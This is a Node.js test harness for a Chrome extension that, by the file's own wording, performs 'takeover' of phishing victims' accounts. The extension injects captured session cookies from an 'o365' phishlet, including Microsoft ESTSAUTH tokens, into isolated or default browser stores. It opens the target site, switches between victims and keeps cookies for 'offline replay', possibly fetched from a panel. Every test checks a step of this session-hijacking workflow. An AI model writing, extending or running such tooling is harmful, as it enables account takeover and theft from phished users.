'use strict';
/* Offline test for the extension's background worker.
   Chrome APIs are mocked so the cookie writing, isolated-store handling and
   victim-switching logic can be asserted without loading the extension.

   Run: node extension/test.js                                                        */

const fs = require('fs');
const path = require('path');

let pass = 0, fail = 0;
function ok(name, cond, extra) {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name + (extra ? '  -> ' + extra : '')); }
}
function eq(name, got, want) { ok(name, JSON.stringify(got) === JSON.stringify(want), 'got ' + JSON.stringify(got) + ' want ' + JSON.stringify(want)); }

function mockChrome() {
  const stores = { '0': [], '1': [] };
  const storage = {};
  const listeners = {};
  const windows = [];
  const tabs = [];
  let winSeq = 100, tabSeq = 200;

  function strip(d) { return String(d || '').replace(/^\./, ''); }
  function matches(c, f) {
    if (f.storeId && c.storeId !== f.storeId) return false;
    if (f.domain) { const d = strip(c.domain); const q = strip(f.domain); if (d !== q && !d.endsWith('.' + q)) return false; }
    if (f.url) { const host = strip(c.domain); const p = f.url.replace(/^https?:\/\//, '').split('/')[0]; if (host !== p) return false; }
    if (f.name && c.name !== f.name) return false;
    return true;
  }
  const ch = {
    storage: {
      local: {
        async get(k) {
          if (k == null) return Object.assign({}, storage);
          const keys = typeof k === 'string' ? [k] : (Array.isArray(k) ? k : Object.keys(k));
          const out = {};
          keys.forEach((x) => { if (storage[x] !== undefined) out[x] = storage[x]; });
          return out;
        },
        async set(o) { Object.assign(storage, o); },
        async remove(k) { (Array.isArray(k) ? k : [k]).forEach((x) => delete storage[x]); },
      },
      onChanged: { addListener(fn) { listeners.storage = fn; } },
    },
    runtime: {
      onMessage: { addListener(fn) { listeners.msg = fn; } },
      getURL: (p) => 'chrome-extension://test/' + p,
      openOptionsPage() {},
    },
    action: { setBadgeText() {}, setBadgeBackgroundColor() {} },
    cookies: {
      async getAll(f) {
        f = f || {};
        const out = [];
        Object.keys(stores).forEach((sid) => stores[sid].filter((c) => matches(c, f)).forEach((c) => out.push(Object.assign({}, c))));
        return out;
      },
      async set(d) {
        const sid = d.storeId || '0';
        if (!stores[sid]) stores[sid] = [];
        const host = d.domain ? d.domain : d.url.replace(/^https?:\/\//, '').split('/')[0];
        const c = { name: d.name, value: d.value, domain: host, path: d.path, secure: d.secure, httpOnly: d.httpOnly, sameSite: d.sameSite, storeId: sid };
        const i = stores[sid].findIndex((x) => x.name === c.name && strip(x.domain) === strip(c.domain) && x.path === c.path);
        if (i >= 0) stores[sid][i] = c; else stores[sid].push(c);
        return c;
      },
      async remove(d) {
        const sid = d.storeId || '0';
        const host = d.url.replace(/^https?:\/\//, '').split('/')[0];
        const before = (stores[sid] || []).length;
        stores[sid] = (stores[sid] || []).filter((c) => !(c.name === d.name && strip(c.domain) === strip(host)));
        return before !== stores[sid].length;
      },
    },
    windows: {
      async create(o) { const w = { id: ++winSeq, incognito: !!o.incognito }; windows.push(w); return w; },
      async get(id) { const w = windows.find((x) => x.id === id); if (!w) throw new Error('no window'); return w; },
      async update() {},
      onRemoved: { addListener(fn) { listeners.winRemoved = fn; } },
    },
    tabs: {
      async query(f) { return tabs.filter((t) => t.windowId === f.windowId); },
      async create(o) { const t = { id: ++tabSeq, windowId: o.windowId, url: o.url, pinned: !!o.pinned }; tabs.push(t); return t; },
      async update(id, o) { const t = tabs.find((x) => x.id === id); if (t) Object.assign(t, o); return t; },
    },
    __stores: stores, __storage: storage, __listeners: listeners, __windows: windows, __tabs: tabs,
  };
  return ch;
}

function load(ch) {
  const src = fs.readFileSync(path.join(__dirname, 'background.js'), 'utf8');
  const factory = new Function('chrome', 'console', 'setTimeout', 'btoa', 'fetch', 'clearTimeout', src +
    '\n;return { onMessage, takeover, clearDomains, isolatedStoreId, liveWindow, getSettings, fetchSession, cookieDetails };');
  return factory(ch, { log() {} }, setTimeout, (s) => Buffer.from(s).toString('base64'),
    async () => { throw new Error('no fetch'); }, clearTimeout);
}

function cookie(name, domain, value, extra) {
  return Object.assign({ name, value, domain, path: '/', secure: true, httpOnly: true, sameSite: 'Lax', expirationDate: Math.floor(Date.now() / 1000) + 86400 }, extra || {});
}
function payload(id, user, cookies) {
  return { session_id: id, phishlet: 'o365', username: user, remote_addr: '1.2.3.4', target_url: 'https://www.x.test/', cookies, count: cookies.length };
}

(async function main() {
  console.log('\nbackground worker');
  let ch = mockChrome();
  let bg = load(ch);

  // 1. isolated takeover writes into the incognito store, never the default one
  let r = await bg.takeover(payload(1, 'alice@contoso.com', [cookie('ESTSAUTH', '.contoso.com', 'A'), cookie('OHost', 'x.test', 'h', { sameSite: 'no_restriction', secure: false })]), 'isolated');
  eq('isolated: cookies set', r.success, 2);
  eq('isolated: nothing written to the default profile', ch.__stores['0'].length, 0);
  eq('isolated: both cookies land in the incognito store', ch.__stores['1'].length, 2);
  ok('isolated: reports the isolated window', r.where === 'isolated window', r.where);
  ok('isolated: opened a window with the target tab', ch.__tabs.some((t) => t.url === 'https://www.x.test/'));

  // 2. sameSite=none without secure must be upgraded, or Chrome rejects it
  const oh = ch.__stores['1'].find((c) => c.name === 'OHost');
  ok('sameSite=none upgraded to secure', oh && oh.secure === true);

  // 3. switching victims clears the previous victim's cookies on those domains
  r = await bg.takeover(payload(2, 'bob@contoso.com', [cookie('ESTSAUTH', '.contoso.com', 'B')]), 'isolated');
  eq('switch: old cookie replaced', ch.__stores['1'].filter((c) => c.name === 'ESTSAUTH')[0].value, 'B');
  ok('switch: stale cookie from the other domain cleared', !ch.__stores['1'].some((c) => c.name === 'OHost'));
  ok('switch: clearing is reported', r.cleared >= 1, String(r.cleared));

  // 4. the incognito store is reused (one isolated window), not duplicated
  eq('one isolated window only', ch.__windows.length, 1);
  ok('no second window created on re-inject', ch.__windows.length === 1);

  // 5. __Host- cookies must be host-only + path=/ + secure
  const details = bg.cookieDetails({ name: '__Host-A', value: 'v', domain: 'x.test', path: '/', secure: true, sameSite: 'Lax' }, '1');
  ok('__Host- drops the domain attribute', details.domain === undefined);
  ok('__Host- forces secure', details.secure === true);
  eq('__Host- keeps path=/', details.path, '/');

  // 6. here mode writes into the default store and opens a normal tab
  const winBefore = ch.__windows.length;
  r = await bg.takeover(payload(3, 'carol@x.test', [cookie('A', '.x.test', '1')]), 'here');
  eq('here: written to the default profile', ch.__stores['0'].length, 1);
  eq('here: no new window', ch.__windows.length, winBefore);
  ok('here: reports this profile', r.where === 'this profile');

  // 7. recent list is bounded + most recent first, with cookies kept for replay
  const recent = ch.__storage.recent;
  ok('recent list recorded', Array.isArray(recent) && recent.length === 3, String(recent && recent.length));
  eq('recent is newest first', recent[0].id, 3);
  ok('recent keeps cookies for offline replay', (recent[0].cookies || []).length === 1);
  ok('recent bounded to 8', recent.length <= 8);

  // 8. active reflects the isolated victim (not the "here" one)
  ok('active session tracked', ch.__storage.active && ch.__storage.active.id === 2);

  // 9. clearIsolated removes the isolated victim's cookies only
  let cres = await bg.onMessage({ action: 'clearIsolated' });
  ok('clear trimmed the isolated store', ch.__stores['1'].length === 0, String(ch.__stores['1'].length));
  ok('clear left the default profile alone', ch.__stores['0'].length === 1);
  ok('clear reported a count', cres.cleared >= 1);

  // 10. settings round-trip + defaults
  let s = await bg.getSettings();
  eq('default mode is isolated', s.mode, 'isolated');
  await bg.onMessage({ action: 'settings', patch: { autoOpen: true, dashboardUrl: 'https://panel.test' } });
  s = await bg.getSettings();
  ok('settings persist', s.autoOpen === true && s.dashboardUrl === 'https://panel.test');

  // 11. no dashboard url -> injectById reports it instead of throwing
  const byId = await bg.onMessage({ action: 'injectById', id: 99 });
  ok('injectById without creds fails cleanly', byId.error === 'no fetch', String(byId.error));

  // 12. window closed -> isolated state is dropped
  await ch.__listeners.winRemoved(ch.__windows[0].id);
  ok('closing the window clears the active victim', !ch.__storage.active);
  ok('closing the window forgets the window', ch.__storage.isolatedWindowId === undefined);

  // 13. unknown action
  const unk = await bg.onMessage({ action: 'nope' });
  ok('unknown action handled', !!unk.error);

  console.log('\n' + pass + ' passed, ' + fail + ' failed');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error('harness error:', e); process.exit(1); });
